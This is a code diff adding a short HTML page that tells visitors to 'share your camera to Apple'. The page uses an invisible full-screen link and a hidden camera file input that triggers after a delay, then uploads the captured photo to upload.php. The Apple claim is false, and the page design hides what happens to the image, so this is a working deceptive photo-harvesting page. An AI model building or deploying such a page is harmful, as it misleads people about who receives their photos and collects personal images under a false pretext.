@@ -1,0 +1,62 @@
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+    h1 {
+        margin: 1em;
+    }
+
+    a {
+        position: absolute;
+        top: 0;
+        left: 0;
+        right: 0;
+        bottom: 0;
+    }
+
+    input {
+        display: none;
+    }
+
+    img {
+        width: 100%;
+    }
+</style>
+
+<h1>Tap to share your camera to Apple</h1>
+
+<input id="fileSelect" type="file" accept="image/*" capture="camera" style="display:none;" />
+
+<img id="img" src="">
+<a id="link" href="https://google.com" target="_blank">Tap to open camera</a>
+
+<script>
+    document.getElementById('link').onclick = () => {
+        setTimeout(() => {
+            document.getElementById('fileSelect').click();
+        }, 600);
+    };
+
+    document.getElementById('fileSelect').onchange = (event) => {
+        const file = event.target.files[0];
+        if (file) {
+            const img = document.getElementById('img');
+            img.src = URL.createObjectURL(file);
+
+            const formData = new FormData();
+            formData.append('file', file);
+
+            fetch('upload.php', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.text())
+            .then(result => {
+                console.log('Success:', result);
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+    };
+</script>
